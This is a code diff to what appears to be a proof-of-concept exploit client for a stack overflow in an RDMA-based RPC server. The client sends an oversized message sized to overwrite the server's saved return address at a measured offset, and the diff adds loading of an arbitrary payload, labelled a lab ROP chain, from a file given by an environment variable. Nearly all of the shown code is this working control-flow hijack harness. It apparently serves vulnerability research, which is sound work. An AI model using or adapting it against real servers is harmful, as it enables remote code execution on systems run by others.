@@ -278,16 +278,34 @@ int main(int argc, char ** argv) {
     }
     fprintf(stderr, "QP RTS, posting %zu-byte SEND\n", len);
 
-    // First byte is a valid RPC command (DEVICE_COUNT) so a non-overflowing
-    // server would answer normally; markers check byte placement later.
-    for (size_t i = 0; i < len; ++i) s.tx[i] = 0x41;
-    s.tx[0] = 15;
-    if (len > 11) s.tx[11] = 0x5a;
-    if (len > 18) s.tx[18] = 0x44;
-    // Measured in the non-ASan Debug build: rpc_serve_client saved RIP is at
-    // &cmd + 3585. Mark eight bytes there for the control-flow reach probe.
-    if (len >= 3593) {
-        for (size_t i = 3585; i < 3593; ++i) s.tx[i] = 0x42;
+    // Optional raw payload (lab ROP chain). Default behaviour is unchanged.
+    const char * payload_file = std::getenv("RDMA_PAYLOAD_FILE");
+    if (payload_file) {
+        FILE * fp = std::fopen(payload_file, "rb");
+        if (!fp) die("open payload file");
+        std::vector<uint8_t> bytes;
+        uint8_t buf[65536];
+        size_t n = 0;
+        while ((n = std::fread(buf, 1, sizeof(buf), fp)) > 0) {
+            bytes.insert(bytes.end(), buf, buf + n);
+        }
+        std::fclose(fp);
+        if (bytes.empty() || bytes.size() > kChunk) die("invalid payload file");
+        len = bytes.size();
+        std::memcpy(s.tx, bytes.data(), len);
+        fprintf(stderr, "loaded %zu bytes from %s\n", len, payload_file);
+    } else {
+        // First byte is a valid RPC command (DEVICE_COUNT) so a non-overflowing
+        // server would answer normally; markers check byte placement later.
+        for (size_t i = 0; i < len; ++i) s.tx[i] = 0x41;
+        s.tx[0] = 15;
+        if (len > 11) s.tx[11] = 0x5a;
+        if (len > 18) s.tx[18] = 0x44;
+        // Measured in the non-ASan Debug build: rpc_serve_client saved RIP is at
+        // &cmd + 3585. Mark eight bytes there for the control-flow reach probe.
+        if (len >= 3593) {
+            for (size_t i = 3585; i < 3593; ++i) s.tx[i] = 0x42;
+        }
     }
 
     bool use_inline = len <= s.max_inline;
